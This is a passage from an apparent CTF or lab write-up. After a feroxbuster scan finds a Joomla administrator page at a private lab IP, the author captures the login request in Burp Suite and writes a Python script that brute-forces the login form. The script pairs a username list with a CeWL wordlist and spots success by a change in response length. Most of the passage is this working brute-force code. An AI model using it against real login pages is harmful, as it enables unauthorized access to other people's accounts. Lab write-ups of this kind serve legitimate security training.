Before, feroxbuster found the path to admin page. We can grab login request from this page and extract cookies and request data, and create simple python file which brute force login form.

I first launched burpsuite and send login request. Then, extracted data and cookies, which are required for creating brute force code.

I used python code below :

import requests
import sys

s = requests.session()


url = 'http://192.168.123.79/joomla/administrator/'
cookies = {
    '6821ee9ea803cd64e2920ca203163e81': 'm6pqkuakdrc9p89ogecu417744'
}
s.cookies.update(cookies)

unames = ['Joker','Username','Arthur','username','Smile','Glasgow','Asylum','Arkham','Gotham','Murray','Administrator','Joomla']
with open('/home/kali/tempo/cewl2.txt',mode='r',encoding='utf-8', errors='ignore') as f:
    words = [line.strip('\n') for line in f]

length = len(unames)

i = 1
for uname in unames:
    print(f"{i}/{length}\n")
    for y in words:
        data = {
            'username' : uname,
            'passwd' : y,
            'option' : 'com_login',
            'task' : 'login',
            'return' : 'aW5kZXgucGhw',
            '080ca6a2ec4ebe10b49f316e6796cd85' : '1'
        }
        try:
            resp = s.post(url, data=data, timeout=10, allow_redirects=False)
        except requests.RequestException as e:
            print(resp.content)
            print('request error : ',e)
        print(resp.status_code)
        print(len(resp.content))

        if int(len(resp.content)) != 5222:
            print()
            print(f"Found Creds! : {uname} : {y}")
            sys.exit()
    i += 1

This code returned messy outputs, but I intended to check response lenght and status code for check outputs manually. Also, I knew that the wrong credential input returns 5222 lenght response during test, so I set len(resp.content) != 5222.
